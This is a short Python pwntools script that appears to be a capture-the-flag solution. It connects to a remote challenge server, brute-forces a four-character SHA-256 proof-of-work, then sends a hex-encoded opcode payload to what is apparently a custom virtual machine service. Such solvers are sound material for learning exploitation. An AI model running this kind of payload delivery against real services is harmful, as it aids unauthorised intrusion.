#!/usr/bin/env python
from hashlib import sha256
from pwn import *
context.log_level = 'debug'

def run():
	s='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
	p=remote('34.92.185.118',10002)
	line=p.recvline()
	list1=line.split('==')
	ss=list1[1][1:-1]
	nn=list1[0].split('+')[1][:-2]
	answer1=''
	for a in s:
		for b in s:
			for c in s:
				for d in s:
					proof=a+b+c+d+nn
					digest = sha256(proof).hexdigest()
					if digest==ss:
						answer1=a+b+c+d
						break
	p.recvuntil('Give me XXXX:')
	p.sendline(answer1)
	print 'Find---->'+answer1
	p.recvuntil('opcode(hex): ')
	code = '\x01\x02\x01\x27\x00\x00\x00\x00\x00\x00\x00\x00\x02\x01\x11\x02\x01\x11\x02\x00\x00\x00\x00\x00\x00\x00\x00\x4B' 
	code = code.encode('hex')
	p.sendline(code)
	data =p.recv(100)
	print(data)

run()
